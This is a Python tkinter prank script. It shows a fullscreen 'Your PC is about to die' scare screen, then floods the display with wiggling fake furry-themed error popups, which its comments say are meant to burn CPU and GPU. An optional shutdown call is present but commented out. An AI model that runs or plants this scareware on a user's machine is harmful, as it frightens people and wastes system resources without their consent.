import tkinter as tk
import random, threading, time, os, sys

from shutdown import instant_shutdown

# ============ SETTINGS ============
NUM_POPUPS = 40          # 300+ errors flood the screen
POPUP_INTERVAL = 0.04     # very fast spawn
WIGGLE_MS = 60            # lower = more CPU/GPU burn from animations
SHUTDOWN_TRUE = False 
SHUTDOWN_DELAY = 0          # delay before actual shutdown (in seconds)
# ==================================

ERRORS = [
    ("FurryOS", "KERNEL_PAW_EXCEPTION_NOT_HANDLED", "STOP CODE: 0x00000FUW", "Too much floof detected in sector FUX-01. A tail is wedged in the GPU fan."),
    ("Furry Update Service", "Update Failure (0x8007PAWS)", "Windows Furry Update could not install 'Fluffy_Definitions_v9.3' because fur density exceeds the supported limit.", "snoot.bump not found (0x8007BOOP)"),
    ("FoxyDefender", "Threat detected!", "Real-time protection detected: 'tail_wag.exe' is 100% adorable and cannot be quarantined.", "Recommended action: give head pats immediately."),
    ("System", "Out of memory (WOOF_EXCEPTION)", "The page file is full of fur. 4 GB of free belly rubs required to continue.", "Stop code: 0x00000MRRP"),
    ("Driver Error", "Display driver stopped responding", "nvfurr.sys has stopped responding and has successfully recovered... but it is very sad about it.", "Error: 0x887000EARS"),
    ("FurryOS", "CRITICAL_FLUFF_FAILURE", "STOP CODE: 0x00000YIP", "A critical floof subsystem component has curled up for a nap. Do not wake the component."),
    ("Bluetooth", "Device pairing failed (0x00007TAIL)", "Could not pair with 'Fox Ears (Pro)' — the device wiggled out of range shaking off bath water.", "Hold the paw button for 5 seconds."),
    ("Recycle Bin", "recycle_bin_full_of_toys.exe", "The Recycle Bin is full of squeaky toys and cannot be emptied. The toys are emotionally attached to the system."),
    ("Battery", "Low battery (0x00000NAP)", "Battery at 3%. Your device will hibernate soon and dream about chasing digital squirrels."),
    ("Windows Security", "FUZZWALL has blocked a program", "Fuzzwall prevented 'treats.exe' from accessing your snoot.", "Publisher: Unknown Fluff (Unverified Paws)"),
    ("Storage", "Disk full (0x00000CHONK)", "Drive C: has reached maximum chonk capacity. Delete some old zoomies to free up space."),
    ("FoxySoft Systems 🦊", "MEMORY_CRITICAL (0xDEADBEEF)", "RAM is 99% occupied by photos of your own fox. This is considered normal but unsustainable.", "Do not add more photos. You will add more photos."),
]

EMOJIS = ["🐾", "🦊", "🐱", "🐶", "🐰", "🐻", "🐼", "🦝", "🐹", "💖", "✨", "🧸"]
FOX_TAG = "🦊 FoxySoft Systems — FurryOS v9.9"

def scare_screen():
    """Full-screen cute-but-dire warning."""
    w = tk.Tk()
    w.attributes("-fullscreen", True)
    w.attributes("-topmost", True)
    w.configure(bg="#1b0f2e")

    tk.Label(w, text="🦊", font=("Segoe UI Emoji", 90), bg="#1b0f2e").pack(pady=(120, 10))
    tk.Label(w, text="⚠️ Your PC is about to die ⚠️", font=("Segoe UI", 34, "bold"),
             bg="#1b0f2e", fg="#ff5c8a").pack()
    tk.Label(w, text="...of cuteness overload. There is nothing we can do. We are so sorry. UwU",
             font=("Segoe UI", 14), bg="#1b0f2e", fg="#ffd1dc").pack(pady=10)
    tk.Label(w, text="Storing 999,999,999 bytes of floof... please brace your GPU 🐾",
             font=("Segoe UI", 11), bg="#1b0f2e", fg="#9b8ec4").pack(pady=(30, 0))
    w.after(4000, w.destroy)
    w.mainloop()

def make_error():
    app, title, body, detail = random.choice(ERRORS)
    w = tk.Tk()
    w.title(f"{app} — Error")
    w.attributes("-topmost", True)
    w.resizable(False, False)
    x = random.randint(0, max(w.winfo_screenwidth() - 420, 0))
    y = random.randint(0, max(w.winfo_screenheight() - 220, 0))
    w.geometry(f"+{x}+{y}")

    top = tk.Frame(w, bg="#ffffff")
    top.pack(fill="both", expand=True, padx=14, pady=(14, 4))
    icon = tk.Label(top, text="🦊" if random.random() < 0.35 else "⚠️",
                    font=("Segoe UI Emoji", 30))
    icon.pack(side="left", padx=(0, 12))

    msgbox = tk.Frame(top, bg="#ffffff")
    msgbox.pack(side="left", fill="both", expand=True)
    tk.Label(msgbox, text=title, font=("Segoe UI", 10, "bold"), bg="#ffffff",
             fg="#1a1a1a", wraplength=300, justify="left").pack(anchor="w")
    tk.Label(msgbox, text=body, font=("Segoe UI", 9), bg="#ffffff",
             fg="#1a1a1a", wraplength=300, justify="left").pack(anchor="w", pady=(4, 0))
    tk.Label(msgbox, text=detail, font=("Segoe UI", 8), bg="#ffffff",
             fg="#555555", wraplength=300, justify="left").pack(anchor="w", pady=(6, 0))

    btnbar = tk.Frame(w, bg="#f0f0f0")
    btnbar.pack(fill="x", side="bottom")
    inner = tk.Frame(btnbar, bg="#f0f0f0")
    inner.pack(pady=8)
    tk.Button(inner, text="OK 🐾", width=12).pack(side="left", padx=4)
    if random.random() < 0.5:
        tk.Button(inner, text="Pet instead", width=12).pack(side="left", padx=4)

    # wiggle animation — this is what eats CPU/GPU across 300+ windows
    def wiggle():
        try:
            w.geometry(f"+{x + random.randint(-3, 3)}+{y + random.randint(-3, 3)}")
            w.after(WIGGLE_MS, wiggle)
        except tk.TclError:
            pass
    wiggle()
    w.mainloop()  # stays open until killed

def error_storm():
    for i in range(NUM_POPUPS):
        threading.Thread(target=make_error, daemon=True).start()
        time.sleep(POPUP_INTERVAL)

def main():
    print(FOX_TAG)
    scare_screen()
    threading.Thread(target=error_storm, daemon=True).start()
    while threading.active_count() > 1:
        time.sleep(1)
    #if SHUTDOWN_TRUE:
    #    time.sleep(SHUTDOWN_DELAY)
    #    instant_shutdown()

if __name__ == "__main__":
    main()